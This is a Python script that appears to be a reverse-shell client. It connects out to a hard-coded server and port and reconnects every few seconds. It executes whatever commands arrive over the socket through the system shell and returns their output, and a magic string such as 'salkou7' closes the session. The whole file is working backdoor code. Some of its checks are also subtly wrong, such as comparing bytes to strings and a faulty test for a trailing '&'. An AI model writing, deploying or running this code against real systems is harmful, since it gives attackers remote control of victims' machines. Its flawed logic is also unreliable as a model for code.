import socket
import subprocess
import os
import signal
import time

URL = "127.0.0.1"  # server address
port = 7771        # port


def cmd(c):
    data = c.recv(4096)
    command = data.decode('utf-8')

    if command == "salkou7" or data == "leave" or len(data) == 0:
        return True
    else:

        proc = subprocess.Popen(data,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE,
                                preexec_fn=os.setsid)
        # get output value
        stdout_value = proc.stdout.read() + proc.stderr.read()
        # kill the process
        os.killpg(proc.pid, signal.SIGTERM)
        # send answer if there is no "&" at the end of the command.
        if data[:-1] != "&":
            c.send(stdout_value)
        return False


socket_died = False

while True:

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:

        client.connect((URL, port))
        print("<<I'm connected>>")
        while True:
            try:
                socket_died = cmd(client)
            except:
                break


    except:
        client.close()
        print("failed to connect..")
        time.sleep(3)





